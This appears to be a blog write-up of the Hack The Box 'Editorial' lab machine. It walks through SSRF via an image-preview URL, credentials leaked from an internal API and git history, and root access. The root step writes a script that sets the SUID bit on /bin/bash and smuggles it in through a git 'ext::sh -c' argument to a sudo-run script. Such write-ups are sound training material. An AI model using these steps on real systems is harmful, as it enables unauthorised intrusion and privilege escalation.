---
title:  HTB - Editorial
date: 2020-11-18 12:17:34 -0400
categories: [hackthebox , Editorial]
tags: [SSRF, Python, Git]
image:
  path: /assets/img/post/editorial/Editorial-card.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hack the Box - Editorial.
---

## Box Info

| Name                  | Editorial        | 
| :-------------------- | ---------------: |
| Release Date          | 15 Jun, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## **Enumeration**

![Image](/assets/img/post/editorial/image.png)

echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts  
![Image](/assets/img/post/editorial/image-1.png)
whatweb:
![Image](/assets/img/post/editorial/image-2.png)
Web:
![Image](/assets/img/post/editorial/image-3.png)
dirsearch -u http://editorial.htb/ 
![Image](/assets/img/post/editorial/image-4.png)

This page is interesting, we can preview an image from a file or url.

![Image](/assets/img/post/editorial/image-5.png)

## SSRF

The file name is renamed and the file extension is removed. When we open the preview image in a new tab, the file downloaded directly, so it seems like we can’t execute any shell directly.

When I upload a file and add a url "http://127.0.0.1/" and intercept with BurpSuite, we can see the response 200 OK and showing a image directory location, this point to a `SSRF`.

![Image](/assets/img/post/editorial/image-6.png)

In an [SSRF](https://portswigger.net/web-security/ssrf) attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like `127.0.0.1` (a reserved IP address that points to the loopback adapter) or `localhost` (a commonly used name for the same adapter)

![Image](/assets/img/post/editorial/image-7.png)

The response shows us a directory path, let's download the file and see what's inside.

![Image](/assets/img/post/editorial/image-8.png)

![Image](/assets/img/post/editorial/image-9.png)


![Image](/assets/img/post/editorial/image-10.png)

And re upload the file and add the path in burpsuite.

`/api/latest/metadata/messages/authors`{: .filepath}

![Image](/assets/img/post/editorial/image-11.png)

![Image](/assets/img/post/editorial/image-12.png)

Username: dev - Password: dev080217_devAPI!@
![Image](/assets/img/post/editorial/image-13.png)

user flag
![Image](/assets/img/post/editorial/image-14.png)

![Image](/assets/img/post/editorial/image-15.png)

### Linux Enumeration

```bash
find / -user dev 2>/dev/null | grep -vE "sys|proc"
```

![Image](/assets/img/post/editorial/image-16.png)


![Image](/assets/img/post/editorial/image-17.png)

The command `Git show` displays detailed information about a commit.

![Image](/assets/img/post/editorial/image-18.png)


![Image](/assets/img/post/editorial/image-19.png)

080217_Producti0n_2023!@ for prod
- su `prod`
- password: `080217_Producti0n_2023!@`

## Privilege Escalation

sudo -l

![Image](/assets/img/post/editorial/image-20.png)

```bash
- echo '#!/bin/bash' > /tmp/exploit.sh

- echo 'chmod u+s /bin/bash' >> /tmp/exploit.sh
```

![Image](/assets/img/post/editorial/image-21.png)

```bash
- sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c '/tmp/exploit.sh'"
```

![Image](/assets/img/post/editorial/image-22.png)

- `ls -l /bin/bash`

![Image](/assets/img/post/editorial/image-23.png)

Start a new bash session.

- `/bin/bash -p` 

![Image](/assets/img/post/editorial/image-24.png)

